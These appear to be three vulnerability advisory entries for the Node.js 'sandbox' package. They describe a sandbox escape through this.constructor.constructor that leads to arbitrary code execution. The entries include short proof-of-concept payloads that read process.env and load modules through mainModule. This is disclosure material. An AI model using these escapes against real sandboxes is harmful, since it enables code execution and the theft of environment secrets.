  title: Sandbox Breakout / Arbitrary Code Execution
  description: All versions of `sandbox` are vulnerable to Sandbox Escape leading
    to Remote Code Execution. The package fails to restrict access to the main context
    through `this.constructor.constructor` . This may allow attackers to execute arbitrary
    code in the system. Evaluating the payload `this.constructor.constructor('return
    process.env')()` prints the contents of `process.env`.

  title: Sandbox Breakout / Arbitrary Code Execution
  description: |-
    All versions of `sandbox` are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.

    ## Proof of concept
    ```
    var Sandbox = require("sandbox")
    s = new Sandbox()
    code = `new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("util").inspect("hi")`
    s.run(code)
    ```

  title: Arbitrary Code Execution
  description: |
    [`sandbox`][1] is a nifty javascript sandbox for node.js.

    Affected versions of the package are vulnerable to Arbitrary Code
    Execution. It is possible to escape the sandbox by using a combination
    of functions and constructors, allowing an attacker access to a process
    with root permissions, and load modules of their choosing in order to
    execute malicious code.

    PoC by io Void:

        new Function("
          return (
            this.constructor.constructor('
              return (this.process.mainModule.constructor._load
             )'
            )())"
          )()
        ("util").inspect("hi")
